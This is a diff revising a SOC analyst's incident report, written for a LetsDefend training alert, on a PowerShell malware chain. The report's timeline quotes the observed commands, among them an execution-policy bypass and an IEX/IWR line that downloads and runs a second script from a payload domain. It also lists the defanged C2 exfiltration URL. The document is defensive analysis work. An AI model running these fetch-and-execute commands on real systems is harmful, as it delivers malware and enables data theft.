@@ -22,21 +22,21 @@ T1071.001 (Application Layer Protocol: Web Protocols) - Uses HTTPS for payload s
 
 TA0011 (Command and Control) - Uses C2 server hosted at 91[.]236[.]116[.]163 to exfiltrate data.
 
-IOCS INCLUDED IN LETS DEFEND (DONT WORRY ABOUT THESE)	
+IOCS: Included in LetsDefend.
  
 Summary: 
 
-On 2024-03-14 at 17:23:00 UTC, a malicious PowerShell script named payload_1.ps1 was executed on Tony's host machine. This intial payload is used to download and execute a secondary payload from a payload delivery domain (kionagranada[.]com). Once the second payload is executed, data is exfiltrated to a C2 address based in Sweden (91[.]236[.]116[.]163). Cleaning of the two PowerShell scripts is advised. This alert has been deemed a true positive.
+On 2024-03-14 at 17:23:00 UTC, a malicious PowerShell script named payload_1.ps1 was executed on Tony's host machine. This initial payload is used to download and execute a secondary payload from a payload delivery domain (kionagranada[.]com). Once the second payload is executed, data is exfiltrated to a C2 address based in Sweden (91[.]236[.]116[.]163). Cleaning of the two PowerShell scripts is advised. This alert has been deemed a true positive.
 
 Reasoning:
 
-The initial payload (payload_1.ps1) was analyzed by VirusTotal, with 35 security vendors confirming malicious intent. There are several log entries indicating compromise of our network and exfiltration of data to a C2 address. There was access to a malicious payload delivery domain (kionagranada[.]) and modification of a built-in PowerShell security configuration. Escalation to L2 is highly advised.
+The initial payload (payload_1.ps1) was analyzed by VirusTotal, with 35 security vendors confirming malicious intent. There are several log entries indicating compromise of our network and exfiltration of data to a C2 address. There was access to a malicious payload delivery domain (kionagranada[.]com) and modification of a built-in PowerShell security configuration. Escalation to L2 is highly advised.
 
 Timeline - Time (UTC) | Event
 
 2024-03-14 17:22:25 UTC - HTTPS request for hxxps://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1 (3.5.130.147).
 
-2024-03-14 17:22:XX UTC - Attempt to bypass safety configurations for powershell regarding payload_1.ps1 and the executes it: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-Command" "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\LetsDefend\Downloads\payload_1.ps1\payload_1.ps1.'"
+2024-03-14 17:22:XX UTC - Attempt to bypass safety configurations for powershell regarding payload_1.ps1 and then executes it: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-Command" "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\LetsDefend\Downloads\payload_1.ps1\payload_1.ps1.'"
 
 2024-03-14 17:22:XX UTC - Executes remote command, initiates web request for payload delivery domain to retrieve sd2.ps1 and executes it: "C:\Windows\system32\cmd.exe" /c "powershell -command IEX(IWR -UseBasicParsing 'hxxps://kionagranada.com/upload/sd2.ps1')."
 
@@ -44,23 +44,24 @@ Timeline - Time (UTC) | Event
 
 2024-03-14 17:23:XX UTC - Contacted payload delivery domain named kionagranada[.]com over HTTPS (161[.]22[.]46[.]148).
 
-2024-03-14 17:23:XX UTC - Contacts C2 address (91[.]236[.]116[.]163) over HTTP: HXXP://91.236.116.163/INDEX.PHP?ID=90059C37-1320-41A4-B58D-2B75A9850D2F&SUBID=9G6CLLE6.
+2024-03-14 17:23:XX UTC - Contacts C2 address (91[.]236[.]116[.]163) over HTTP: hxxp://91.236.116.163/INDEX.PHP?ID=90059C37-1320-41A4-B58D-2B75A9850D2F&SUBID=9G6CLLE6.
  
 Attack Detail: 
 
-There are 4 parts to the attack chain present. First, initial access to payload_1.ps1. An HTTPS request was made for the initial payload: hxxps://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1. Second, defense evasion and execution. The attacker modified the security configuration of PowerShell to execute the payload_1.ps1 script. Third, secondary payloard delivery and execution. Cmd.exe spawns a new PowerShell instance and a Web Request is invoked to download the second payload sd2.ps1 from the payload delivery domain kionagranada[.]com. Once the second payload is downloaded, it is executed. Lastly, command and control. An HTTP request is made to a C2 address (91[.]236[.]116[.]163), exfiltrating data to the threat actor.
+There are 4 parts to the attack chain present. First, initial access to payload_1.ps1. An HTTPS request was made for the initial payload: hxxps://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1. Second, defense evasion and execution. The attacker modified the security configuration of PowerShell to execute the payload_1.ps1 script. Third, secondary payload delivery and execution. Cmd.exe spawns a new PowerShell instance and a Web Request is invoked to download the second payload sd2.ps1 from the payload delivery domain kionagranada[.]com. Once the second payload is downloaded, it is executed. Lastly, command and control. An HTTP request is made to a C2 address (91[.]236[.]116[.]163), exfiltrating data to the threat actor.
 
 Actions Taken:
--Checked payloard_1.ps1 against VirusTotal, with 35 security vendors marking it as a malicious Boxter/trojan malware.
+-Checked payload_1.ps1 against VirusTotal, with 35 security vendors marking it as a malicious Boxter/trojan malware.
 -Quarantined Tony's host device.
 -Checked logs tied to Tony (172.16.17.206) for anomalous network behavior. Attack chain present, details listed in timeline and attack detail section.
 -Checked EDR for Tony host device. No anomalous processes or telemetry found related to the incident.
--Ruled out anomalous emails from incident.
+-Ruled out anomalous emails from the incident.
 -Escalated to L2.
 
-Reccommended Next Steps:
+Recommended Next Steps:
 -Clean payload_1.ps1 and sd2.ps1 from Tony's host device. 
 -Blacklist C2 address (91[.]236[.]116[.]163) and kionagranada.com from our network and report it to prevent future abuse.
 -Investigate amount of data exfiltrated to C2 address.
 -Reset passwords and credentials for Tony's host device.
+
 
